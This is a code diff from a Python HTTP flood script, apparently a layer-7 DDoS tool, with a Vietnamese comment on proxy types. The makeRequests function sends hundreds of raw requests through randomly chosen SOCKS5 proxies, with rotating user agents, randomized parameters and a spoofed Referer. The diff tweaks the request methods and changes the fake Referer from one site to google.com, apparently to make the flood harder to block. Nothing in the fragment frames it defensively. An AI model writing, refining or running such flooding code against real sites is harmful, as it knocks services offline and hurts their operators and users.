@@ -80,9 +80,9 @@ def makeRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH):
     for hehe in range(1,300):
         _PROXY = random.choice(_PROXIES)
         _USERAGENT = random.choice(_USERAGENTS)
-        a22=['GET ','HEAD ','POST ','PUT ','OPTIONS ']
+        a22=['GET ','HEAD ','POST ']
         a321=random.choice(a22)
-        _HEADERS = a321 + _PATH + randomParams() + " HTTP/1.3\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://zingfast.net/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
+        _HEADERS = a321 + _PATH + randomParams() + " HTTP/1.3\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
         _PROXY = _PROXY.strip()
         try:
             proxyDialer = Proxy.from_url('socks5://' + _PROXY) # Thay đổi socks4 thành socks5 nếu dùng socks5 và ngược lại
